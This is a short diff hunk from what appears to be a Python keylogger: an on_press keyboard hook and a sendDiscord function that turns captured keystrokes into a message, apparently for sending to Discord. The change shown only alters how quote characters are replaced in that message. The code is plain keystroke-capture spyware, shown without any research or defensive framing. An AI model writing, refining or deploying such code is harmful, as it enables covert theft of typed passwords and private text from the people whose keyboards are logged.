@@ -17,7 +17,7 @@ def on_press(key):
 def sendDiscord(keys):
     msg = ""
     for key in keys:
-        k = key.replace("'","\n")
+        k = key.replace("'"," ")
         if key == "Key.space":
             k = " " 
         elif key.find("Key")>0:
